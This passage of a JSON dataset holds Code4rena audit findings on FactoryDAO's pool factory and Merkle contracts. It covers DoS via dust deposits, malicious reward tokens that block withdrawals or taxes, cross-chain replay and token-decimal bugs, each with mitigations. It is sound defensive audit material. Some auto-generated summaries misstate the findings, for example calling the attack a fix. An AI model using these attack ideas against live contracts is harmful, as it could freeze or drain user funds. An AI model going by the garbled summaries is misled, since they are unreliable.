      "summary": "\nThis bug report describes a vulnerability in the PermissionlessBasicPoolFactory.sol contract, which is part of a GitHub repository. The vulnerability allows the owner of the contract to increase the tax rate to 99.9%, meaning that any future pools will be required to pay 99.9% of their rewards in tax to the globalBeneficiary. Furthermore, the globalBeneficiary can modify this and front-run any transactions that call addPool(). \n\nTo prove this vulnerability, the code is presented with a cap for the tax rate of 1000 = 100%. It is recommended to set an upper bound for the tax rate to 5% to mitigate this vulnerability.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/56",
      "tags": [],
      "finders": [
        "reassor",
        "pedroais",
        "leastwood",
        "AuditsAreUS"
      ]
    },
    {
      "id": "2261",
      "title": "[M-18] DoS: Attacker may significantly increase the cost of withdrawExcessRewards() by creating a significant number of excess receipts",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L245\n\n\n## Vulnerability details\n\n## Impact\n\nAn attacker may cause a DoS attack on `withdrawExcessRewards()` by creating a excessive number of `receipts` with minimal value. Each of these receipts will need to be withdrawn before the owner can call `withdrawExcessRewards()`. \n\nThe impact is the owner would have to pay an unbounded amount of gas to `withdraw()` all the accounts and receive their excess funds.\n\n## Proof of Concept\n\n`withdrawExcessRewards()` has the requirement that `totalDepositsWei` for the pool is zero before the owner may call this function as seen on line 245.\n\n```solidity\n        require(pool.totalDepositsWei == 0, 'Cannot withdraw until all deposits are withdrawn');\n```\n\n`pool.totalDepositsWei` is added to each time a user calls `deposit()`. It is increased by the amount the user deposits. There are no restrictions on the amount that may be deposited as a result a user may add 1 wei (or the smallest unit on any currency) which has negligible value.\n\nThe owner can force withdraw these accounts by calling `withdraw()` so long as `block.timestamp > pool.endTime`. They would be required to do this for each account that was created.\n\nThis could be a significant amount of gas costs, especially if the gas price has increased since the attacker originally made the deposits.\n\n## Recommended Mitigation Steps\n\nConsider adding a minimum deposit amount for each pool that can be configured by the pool owner.\n\nAlternatively, allow the owner to call `withdrawExcessRewards()` given some other criteria such as \n- A fix period of time (e.g. 1 month) has passed since the end of the auction; and\n- 90% of the deposits have been withdrawn\nThese criteria can be customised as desired by the design team.",
      "summary": "\nThis bug report is about a potential Denial of Service (DoS) attack on the function withdrawExcessRewards() in the PermissionlessBasicPoolFactory.sol contract. An attacker could create a large number of accounts with minimal value deposits, which would need to be withdrawn before the owner can call withdrawExcessRewards(). This would result in an unbounded amount of gas costs for the owner, especially if the gas price has increased since the deposits were made. \n\nThe recommended mitigation steps are to either add a minimum deposit amount for each pool, or to allow the owner to call withdrawExcessRewards() given some other criteria such as a fix period of time has passed since the end of the auction, and 90% of the deposits have been withdrawn. This criteria can be customised according to the design team's needs.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/54",
      "tags": [
        "Dust",
        "DOS"
      ],
      "finders": [
        "0xf15ers",
        "pedroais",
        "0x52",
        "AuditsAreUS"
      ]
    },
    {
      "id": "2260",
      "title": "[M-17] Owner of a pool may prevent any taxes being withdrawn",
      "impact": "MEDIUM",
      "content": "_Submitted by AuditsAreUS, also found by IllIllI_\n\nIt is possible for the owner of a pool to prevent any taxes being withdrawn by the `globalBeneficiary`. The impact is the taxed tokens will be permanently locked in the contract and `withdrawTaxes()` will not be callable for that `poolId`.\n\n### Proof of Concept\n\nThe attack works by setting one of the `rewardTokenAddresses` to a malicious contract during `addPool()`. The malicious contract is set such that it will revert on the call `pool.rewardTokens[i]).transfer(globalBeneficiary, tax)` if an only if the `to` address is \\`globalBeneficiary.\n\nThe result of this attack is that if one reward transfer fails then entire `withdrawTaxes()` transaction will revert and no taxes can be claimed. However, the pool will function correctly for all other users.\n\n```solidity\n    function withdrawTaxes(uint poolId) external {\n        Pool storage pool = pools[poolId];\n        require(pool.id == poolId, 'Uninitialized pool');\n\n\n        bool success = true;\n        for (uint i = 0; i < pool.rewardTokens.length; i++) {\n            uint tax = taxes[poolId][i];\n            taxes[poolId][i] = 0;\n            success = success && IERC20(pool.rewardTokens[i]).transfer(globalBeneficiary, tax);\n        }\n        require(success, 'Token transfer failed');\n    }\n```\n\n### Recommended Mitigation Steps\n\nThere are a few mitigations to this issue.\n\nThe first is for the `withdrawTaxes()` function to take both `poolId` and `rewardIndex` as a parameters to allowing the tax beneficiary to only withdraw from certain reward tokens in the pool. This would allow the beneficiary to withdraw from all reward tokens except malicious ones.\n\nThe second mitigation is to implement a `try-catch` condition around the withdrawal of reward tokens. In the catch statement re-instate the `taxes[poolId][i] = tax` if the transfer fails. Alternatively just skip the reward tokens if the transfer fails though this would be undesirable if a token is paused for some reason.\n\n**[illuzen (FactoryDAO) confirmed, disagreed with severity and commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/52#issuecomment-1122016021):**\n > Valid, will probably do `try-catch`.\n\n**[illuzen (FactoryDAO) resolved](https://github.com/code-423n4/2022-05-factorydao-findings/issues/52#issuecomment-1145530021):**\n > https://github.com/code-423n4/2022-05-factorydao/pull/2\n\n**[Justin Goro (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/52#issuecomment-1154655710):**\n > Downgraded: deposited funds not at risk but value leakage occurs.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the PermissionlessBasicPoolFactory.sol code. It is possible for the owner of a pool to prevent any taxes being withdrawn by the globalBeneficiary. If the malicious contract is set such that it will revert on the call `pool.rewardTokens[i]).transfer(globalBeneficiary, tax)` if an only if the `to` address is `globalBeneficiary`, then the entire `withdrawTaxes()` transaction will revert and no taxes can be claimed. However, the pool will function correctly for all other users.\n\nThere are two recommended mitigation steps to address this issue. The first is for the `withdrawTaxes()` function to take both `poolId` and `rewardIndex` as a parameters to allowing the tax beneficiary to only withdraw from certain reward tokens in the pool. The second mitigation is to implement a `try-catch` condition around the withdrawal of reward tokens. In the catch statement re-instate the `taxes[poolId][i] = tax` if the transfer fails. Alternatively just skip the reward tokens if the transfer fails though this would be undesirable if a token is paused for some reason.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/52",
      "tags": [],
      "finders": [
        "AuditsAreUS",
        "IllIllI"
      ]
    },
    {
      "id": "2259",
      "title": "[M-16] ERC20 tokens with different decimals than 18 leads to loss of funds",
      "impact": "MEDIUM",
      "content": "_Submitted by reassor, also found by hyh, IllIllI, kenzo, leastwood, rajatbeladiya, VAD37, and ych18_\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L169>\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L282>\n\n### Impact\n\nContract `PermissionlessBasicPoolFactory` calculates rewards by using hardcoded value of decimals `18` (1e18) for ERC20 tokens. This leads to wrong rewards calculations and effectively loss of funds for all pools that will be using ERC20 tokens with different decimals than `18`. Example of such a token is USDC that has 6 decimals only.\n\n### Proof of Concept\n\n*   <https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L169>\n*   <https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L282>\n\n### Tools Used\n\nManual Review / VSCode\n\n### Recommended Mitigation Steps\n\nIt is recommended to add support for different number of decimals than `18` by dynamically checking `decimals()` for the tokens that are part of the rewards calculations. Alternatively if such a support is not needed, new require statements should be added to `addPool` that will be checking that the number of decimals for all ERC20 tokens is `18`.\n\n**[illuzen (FactoryDAO) confirmed](https://github.com/code-423n4/2022-05-factorydao-findings/issues/47#issuecomment-1122004512)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue with the contract \"PermissionlessBasicPoolFactory\" which is used to calculate rewards. The contract uses a hardcoded value of decimals (1e18) for ERC20 tokens, which can lead to wrong rewards calculations and loss of funds. An example of such a token is USDC which has 6 decimals only. To fix this issue, it is recommended to add support for different number of decimals than 18 by dynamically checking `decimals()` for the tokens that are part of the rewards calculations. Alternatively, new require statements should be added to `addPool` that will check that the number of decimals for all ERC20 tokens is 18.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/47",
      "tags": [],
      "finders": [
        "VAD37",
        "IllIllI",
        "reassor",
        "leastwood",
        "rajatbeladiya",
        "hyh",
        "kenzo",
        "ych18"
      ]
    },
    {
      "id": "2258",
      "title": "[M-15] PermissionlessBasicPoolFactoryâ€™s withdraw can become frozen on zero reward token transfers",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L230-L230\n\n\n## Vulnerability details\n\nReward tokens that do not allow for zero amount transfers can prevent user pool exit.\n\nNow it is required that all reward amounts be successfully transferred to a receipt owner and the reward token amount isn't checked in the process.\n\nIf withdraw was called at the moment when some reward amount is zero (because either zero time passed or zero slope is set), the withdraw() will revert.\n\nSay once such reward token is there (say with no malicious intent, as it's just a specifics of some valid tokens), user cannot withdraw immediately after deposit as no rewards accrued yet and this token transfer will revert the whole call even if it is one of the many.\n\nAs withdraw() the only way for a user to exit pool, her funds will be frozen within.\n\nIf slope is set to zero for such a token, either maliciously or mistakenly, the withdrawals are impossible for all the users.\n\nAs this is user fund freeze case with external assumptions, setting the severity to medium.\n\n## Proof of Concept\n\nSome ERC20 tokens do not allow for zero amount transfers:\n\nhttps://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers\n\nwithdraw() iterates across the set of reward tokens, and requires all transfers to go through:\n\nhttps://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L230-L230\n\n```solidity\nsuccess = success && IERC20(pool.rewardTokens[i]).transfer(receipt.owner, transferAmount);\n```\n\nOnce some is not ok, the whole call reverts. As it's the only way for a user to exit the pool, her funds are frozen until non-zero reward is obtained.\n\nIt might never happen as rewardsWeiPerSecondPerToken is allowed to be zero:\n\nhttps://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L92-L112\n\n```solidity\n    function addPool (\n        uint startTime,\n        uint maxDeposit,\n        uint[] memory rewardsWeiPerSecondPerToken,\n        uint programLengthDays,\n        address depositTokenAddress,\n        address excessBeneficiary,\n        address[] memory rewardTokenAddresses,\n        bytes32 ipfsHash,\n        bytes32 name\n    ) external {\n        Pool storage pool = pools[++numPools];\n        pool.id = numPools;\n        pool.rewardsWeiPerSecondPerToken = rewardsWeiPerSecondPerToken;\n        pool.startTime = startTime > block.timestamp ? startTime : block.timestamp;\n        pool.endTime = pool.startTime + (programLengthDays * 1 days);\n        pool.depositToken = depositTokenAddress;\n        pool.excessBeneficiary = excessBeneficiary;\n        pool.taxPerCapita = globalTaxPerCapita;\n\n        require(rewardsWeiPerSecondPerToken.length == rewardTokenAddresses.length, 'Rewards and reward token arrays must be same length');\n```\n\nThis way, when one of the reward tokens doesn't allow for zero transfers:\n1) immediate withdraw after deposit is impossible\n2) factory allows for creation of malicious or misconfigured pools by adding such a reward token with zero rewardsWeiPerSecondPerToken, making withdraw impossible for all users\n\n## Recommended Mitigation Steps\n\nConsider controlling for zero amounts in reward transfer cycle:\n\n```solidity\n        for (uint i = 0; i < rewards.length; i++) {\n+\t        if (rewards[i] > 0) {\n\t            pool.rewardsWeiClaimed[i] += rewards[i];\n\t            pool.rewardFunding[i] -= rewards[i];\n\t            uint tax = (pool.taxPerCapita * rewards[i]) / 1000;\n\t            uint transferAmount = rewards[i] - tax;\n\t            taxes[poolId][i] += tax;\n\t            success = success && IERC20(pool.rewardTokens[i]).transfer(receipt.owner, transferAmount);\n+\t        }\n        }\n```\n\nhttps://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L224-L231",
      "summary": "\nA bug has been found in the code for the PermissionlessBasicPoolFactory.sol contract. This bug could potentially prevent users from exiting a pool, freezing their funds in the process. The bug occurs when the withdraw() function is called at the moment when a reward amount is zero (because either zero time has passed or zero slope is set). The withdraw() function will revert, preventing the user from exiting the pool. Additionally, the factory allows for the creation of malicious or misconfigured pools by adding a reward token with a zero rewardsWeiPerSecondPerToken, making withdraw impossible for all users. \n\nThe bug is caused by the fact that all reward amounts must be successfully transferred to a receipt owner and the reward token amount isn't checked in the process. Some ERC20 tokens do not allow for zero amount transfers, which causes the withdraw() function to revert.\n\nThe recommended mitigation step is to control for zero amounts in the reward transfer cycle by adding an if statement that checks for rewards greater than zero. This would prevent the withdraw() function from reverting and allow users to exit the pool.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/175",
      "tags": [],
      "finders": [
        "hyh"
      ]
    },
    {
      "id": "2257",
      "title": "[M-14] Merkle-tree-related contracts vulnerable to cross-chain-replay attacks",
      "impact": "MEDIUM",
      "content": "_Submitted by IllIllI_\n\n> Bank is a token vesting, airdrop and payroll tool. It uses merkle trees to massively scale token distributions with integrated vesting (time locks). The idea of this tool is that it allows DAOs to vest pre-sale participants, and future allocations of tokens (such as DAO treasury allocations) far into the future. These are important contracts since they need longevity and will secure large allocations of tokens.\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/README.md?plain=1#L28>\n\nSince these trees are long-lived, they need to be able to handle forks correctly. If someone generates an exchange address for their drops, that address may only be valid for that chain (e.g. exchange supports BTC but not BSV), and any funds sent to the unsupported chain are lost.\n\n### Impact\n\nIf there's a fork, since anyone can call `withdraw()`, an attacker can monitor the blockchain for calls to `withdraw()`, and then make the same call with the same arguments on the other chain, which will send funds to the unsupported address.\n\n### Proof of Concept\n\nThere are no EIP-712 protections in the encoding:\n\n```solidity\nFile: contracts/MerkleDropFactory.sol   #1\n\n94           bytes32 leaf = keccak256(abi.encode(destination, value));\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/MerkleDropFactory.sol#L94>\n\n```solidity\nFile: contracts/MerkleVesting.sol   #2\n\n109           bytes32 leaf = keccak256(abi.encode(destination, totalCoins, startTime, endTime, lockPeriodEndTime));\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/MerkleVesting.sol#L109>\n\nand anyone can trigger a withdrawal:\n\n```solidity\nFile: contracts/MerkleDropFactory.sol   #3\n\n82       /// @dev Anyone may call this function for anyone else, funds go to destination regardless, it's just a question of\n83       /// @dev who provides the proof and pays the gas, msg.sender is not used in this function\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/MerkleDropFactory.sol#L82-L83>\n\n### Recommended Mitigation Steps\n\nAdd EIP-712 protections and add a mechanism to allow tokens to be transferred to a different address using EIP-2612 `permit()`\n\n**[illuzen (FactoryDAO) acknowledged, disagreed with severity and commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/126#issuecomment-1123394301):**\n > Sending funds to an unusable address on a chain that we didn't intend to be on doesn't seem in scope, but good thinking. In any case, the exchange will have the key for the address on the other chain since private keys are chain agnostic.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about Bank, a token vesting, airdrop and payroll tool. It uses merkle trees to scale token distributions with integrated vesting (time locks). The issue is that if there is a fork, since anyone can call `withdraw()`, an attacker can monitor the blockchain for calls to `withdraw()`, and then make the same call with the same arguments on the other chain, which will send funds to the unsupported address. The bug is caused by the lack of EIP-712 protections in the encoding and anyone can trigger a withdrawal. To fix this issue, the developers need to add EIP-712 protections and add a mechanism to allow tokens to be transferred to a different address using EIP-2612 `permit()`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/126",
      "tags": [],
      "finders": [
        "IllIllI"
      ]
    },
    {
      "id": "2256",
      "title": "[M-13] amount requires to be updated to contract balance increase (1)",
      "impact": "MEDIUM",
      "content": "_Submitted by MaratCerby, also found by 0x1337, 0x52, 0xYamiDancho, AuditsAreUS, berndartmueller, cccz, CertoraInc, csanuragjain, defsec, Dravee, GimelSec, hickuphh3, horsefacts, hyh, IllIllI, jayjonah8, kenzo, leastwood, mtz, p4st13r4, PPrieditis, reassor, Ruhum, throttle, TrungOre, VAD37, wuwe1, and ych18_\n\nEvery time transferFrom or transfer function in ERC20 standard is called there is a possibility that underlying smart contract did not transfer the exact amount entered.\n\nIt is required to find out contract balance increase/decrease after the transfer.<br>\nThis pattern also prevents from re-entrancy attack vector.\n\n### Recommended Mitigation Steps\n\nRecommended code:\n\n```solidity\nfunction fundPool(uint poolId) internal {\n    Pool storage pool = pools[poolId];\n    bool success = true;\n    uint amount;\n    for (uint i = 0; i < pool.rewardFunding.length; i++) {\n        amount = getMaximumRewards(poolId, i);\n        // transfer the tokens from pool-creator to this contract\n\n\n        uint256 balanceBefore = IERC20(pool.rewardTokens[i]).balanceOf(address(this)); // remembering asset balance before the transfer\n        IERC20(pool.rewardTokens[i]).safeTransferFrom(msg.sender, address(this), amount);\n        uint256 newAmount = IERC20(pool.rewardTokens[i]).balanceOf(address(this)) - balanceBefore; // updating actual amount to the contract balance increase\n        success = success && newAmount == amount; // making sure amounts match\n\n        // bookkeeping to make sure pools don't share tokens\n        pool.rewardFunding[i] += amount;\n    }\n    require(success, 'Token deposits failed');\n}\n```\n\n**[illuzen (FactoryDAO) confirmed, disagreed with severity and commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/34#issuecomment-1121979560):**\n > Re-entrance here would involve sending our contract tokens multiple times and creating multiple pools, not withdraw any funds. Malicious tokens could lie about balance as well, so the mitigation doesn't completely fix the issue.\n> \n > And malicious tokens are explicitly considered in the comments as acceptable. What is unacceptable is malicious pools harming other pools.\n\n**[illuzen (FactoryDAO) resolved](https://github.com/code-423n4/2022-05-factorydao-findings/issues/34#issuecomment-1145530416):**\n > https://github.com/code-423n4/2022-05-factorydao/pull/2\n\n**[Justin Goro (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/34#issuecomment-1154610894):**\n > Just a note on the reason for checking token balances before and after: not all tokens that report a difference between the balance and the amount are acting maliciously. In particular fee-on-transfer tokens.\n\n > Reducing severity as this is a value leakage situation and because the sponsor has taken pains to emphasize the isolation of pools and the desire to not have to support all tokens.\n\n\n\n***\n\n",
      "summary": "\nThis bug report concerns a vulnerability in the PermissionlessBasicPoolFactory.sol smart contract, which is part of the code-423n4/2022-05-factorydao repository on Github. The vulnerability can occur when the transferFrom or transfer functions of the ERC20 standard are called, as this can lead to the underlying smart contract not transferring the exact amount entered. The vulnerability can be exploited to prevent re-entrancy attack vectors.\n\nThe recommended mitigation steps for this vulnerability include adding code to the fundPool function to remember the contract balance before the transfer, updating the actual amount to the contract balance increase, and making sure the amounts match. The recommended code is provided in the report.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/34",
      "tags": [
        "ERC20"
      ],
      "finders": [
        "0x52",
        "mtz",
        "berndartmueller",
        "p4st13r4",
        "kenzo",
        "csanuragjain",
        "PPrieditis",
        "VAD37",
        "IllIllI",
        "reassor",
        "wuwe1",
        "cccz",
        "leastwood",
        "hickuphh3",
        "Ruhum",
        "throttle",
        "0x1337",
        "horsefacts",
        "ych18",
        "TrungOre",
        "CertoraInc",
        "MaratCerby",
        "0xYamiDancho",
        "Dravee",
        "AuditsAreUS",
        "jayjonah8",
        "hyh",
        "GimelSec",
        "defsec"
      ]
    },
    {
      "id": "2255",
      "title": "[M-12] Pool owners can prevent withdrawals of specific receipts",
      "impact": "MEDIUM",
      "content": "_Submitted by IllIllI_\n\nPool owners can prevent withdrawals of specific receipts without impacting any other functionality\n\n### Proof of Concept\n\nReciepts are non-transferrable, so a malicious owner can monitor the blockchain for receipt creations, and inspect which account holds the receiptId. Next, by changing settings in a custom reward token that reverts for specific addresses, the owner can prevent that specific receipt owner from withdrawing:\n\n```solidity\nFile: contracts/PermissionlessBasicPoolFactory.sol   #1\n\n230               success = success && IERC20(pool.rewardTokens[i]).transfer(receipt.owner, transferAmount);\n231           }\n232   \n233           success = success && IERC20(pool.depositToken).transfer(receipt.owner, receipt.amountDepositedWei);\n234           require(success, 'Token transfer failed');\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L230-L234>\n\nWhile the sponsor mentions that malicious tokens make the pool malicious, this particular issue has a straight forward fix outlined below in the mitigation section\n\n### Recommended Mitigation Steps\n\nRather than reverting the whole withdrawal if only one transfer fails, return a boolean of whether all withdrawals were successful, and allow `withdraw()` to be called multiple times, keeping track of what has been transferred and what hasn't\n\n**[illuzen (FactoryDAO) confirmed, disagreed with severity and commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/125#issuecomment-1122559541):**\n > Valid, similar to #124 mitigation seems risky, could provide emergencyWithdrawal function instead...\n\n**[illuzen (FactoryDAO) resolved](https://github.com/code-423n4/2022-05-factorydao-findings/issues/125#issuecomment-1145530834):**\n > https://github.com/code-423n4/2022-05-factorydao/pull/2\n\n**[Justin Goro (judge) commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/125#issuecomment-1155847137):**\n > While the example provided is not in scope for the developer to fix, the catch all provided by the sponsor is a good way to act as a last resort protection against loop griefing attacks.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of the PermissionlessBasicPoolFactory.sol smart contract. This vulnerability allows a malicious pool owner to prevent the withdrawal of a specific receipt without affecting any other functionality. The malicious owner can monitor the blockchain for receipt creations, and inspect which account holds the receiptId. Then, they can change settings in a custom reward token that reverts for specific addresses, thus preventing the specific receipt owner from withdrawing. The recommended mitigation steps for this vulnerability are to return a boolean of whether all withdrawals were successful, and allow `withdraw()` to be called multiple times, keeping track of what has been transferred and what hasn't. This issue can be fixed by code inspection.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/125",
      "tags": [],
      "finders": [
        "IllIllI"
      ]
    },
    {
      "id": "2254",
      "title": "[M-11] Pool owners can prevent the payment of taxes",
      "impact": "MEDIUM",
      "content": "_Submitted by IllIllI_\n\nPool owners can prevent taxes from being paid without impacting any other functionality\n\n### Proof of Concept\n\nBy adding a custom reward token that always reverts for transfers to `globalBenericiary`, the owner can prevent taxes from being paid:\n\n```solidity\nFile: contracts/PermissionlessBasicPoolFactory.sol   #1\n\n258       /// @notice Withdraw taxes from pool\n259       /// @dev Anyone may call this, it just moves the taxes from this contract to the globalBeneficiary\n260       /// @param poolId which pool are we talking about?\n261       function withdrawTaxes(uint poolId) external {\n262           Pool storage pool = pools[poolId];\n263           require(pool.id == poolId, 'Uninitialized pool');\n264   \n265           bool success = true;\n266           for (uint i = 0; i < pool.rewardTokens.length; i++) {\n267               uint tax = taxes[poolId][i];\n268               taxes[poolId][i] = 0;\n269               success = success && IERC20(pool.rewardTokens[i]).transfer(globalBeneficiary, tax);\n270           }\n271           require(success, 'Token transfer failed');\n272       }\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L258-L272>\n\nWhile the sponsor mentions that malicious tokens make the pool malicious, this particular issue has a simple fix outlined below in the mitigation section\n\n### Recommended Mitigation Steps\n\nForce taxes to be paid during `withdraw()`\n\n**[illuzen (FactoryDAO) confirmed, disagreed with severity and commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/124#issuecomment-1122558610):**\n > Valid, but adding another transfer to withdraw increases gas costs. And it's possible pool creator and token creator are not same party, so it's not clear the mitigation would be better.\n> \n> I think it's an acceptable risk. If someone wants to go to this level of trouble, they could just fork the contract and remove the fees.\n\n**[illuzen (FactoryDAO) resolved](https://github.com/code-423n4/2022-05-factorydao-findings/issues/124#issuecomment-1145530765):**\n > https://github.com/code-423n4/2022-05-factorydao/pull/2\n\n**[Justin Goro (judge) commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/124#issuecomment-1155844048):**\n > Validating against tokens specifically written with if statements for this contract is not really something a developer can prevent. For instance, a token creator can cause their token to revert if the contract requesting transferFrom approval is a Uniswap router. This would prevent all trade of that token within Uniswap. But that's certainly not the failing of the Uniswap developers.\n> \n> However, for tokens in particular, it is recommended to not revert on bad implementations and so the issue will be treated as belonging to that camp of suggestions. For that reason, the risk status will remain 2.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Pool Factory contract (PermissionlessBasicPoolFactory.sol) that allows pool owners to prevent taxes from being paid without impacting any other functionality. The code inspection tool was used to find the issue. The recommended mitigation step is to force taxes to be paid during the withdraw() function. The bug is fixed by adding a custom reward token that always reverts for transfers to globalBeneficiary.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/124",
      "tags": [],
      "finders": [
        "IllIllI"
      ]
    },
    {
      "id": "2253",
      "title": "[M-10] Unbounded loop in withdraw() may cause rewards to be locked in the contract",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L224-L231\n\n\n## Vulnerability details\n\n## Impact\nThe `withdraw()` has an unbounded loop with external calls. If the gas costs of functions change between when deposits are made and when rewards are withdrawn, or if the gas cost of the deposit (`transferFrom()`) is less than the gas cost of the withdrawal (`transfer()`), then the `withdraw()` function may revert due to exceeding the block size gas limit.\n\n## Proof of Concept\n`transfer()` is an external call, and `rewards.length` has no maximum size:\n```solidity\nFile: contracts/PermissionlessBasicPoolFactory.sol   #1\n\n224           for (uint i = 0; i < rewards.length; i++) {\n225               pool.rewardsWeiClaimed[i] += rewards[i];\n226               pool.rewardFunding[i] -= rewards[i];\n227               uint tax = (pool.taxPerCapita * rewards[i]) / 1000;\n228               uint transferAmount = rewards[i] - tax;\n229               taxes[poolId][i] += tax;\n230               success = success && IERC20(pool.rewardTokens[i]).transfer(receipt.owner, transferAmount);\n231           }\n```\nhttps://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L224-L231\n\n## Tools Used\nCode inspection\n\n## Recommended Mitigation Steps\nAllow the specification of an offset and length to the `withdraw()` function, so that withdrawals can be broken up into smaller batches if required",
      "summary": "\nThis bug report is about a vulnerability in the `withdraw()` function in the PermissionlessBasicPoolFactory.sol code. It is an unbounded loop with external calls, which means that if the gas costs of functions change between when deposits are made and when rewards are withdrawn, or if the gas cost of the deposit is less than the gas cost of the withdrawal, then the `withdraw()` function may revert due to exceeding the block size gas limit. The vulnerability was identified through code inspection.\n\nThe impact of this vulnerability is that it could cause the `withdraw()` function to revert due to exceeding the block size gas limit. To mitigate this vulnerability, it is recommended to allow the specification of an offset and length to the `withdraw()` function, so that withdrawals can be broken up into smaller batches if required.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/122",
      "tags": [],
      "finders": [
        "IllIllI"
      ]
    },
    {
      "id": "2252",
      "title": "[M-09] Rebasing tokens go to the pool owner, or remain locked in the various contracts",
      "impact": "MEDIUM",
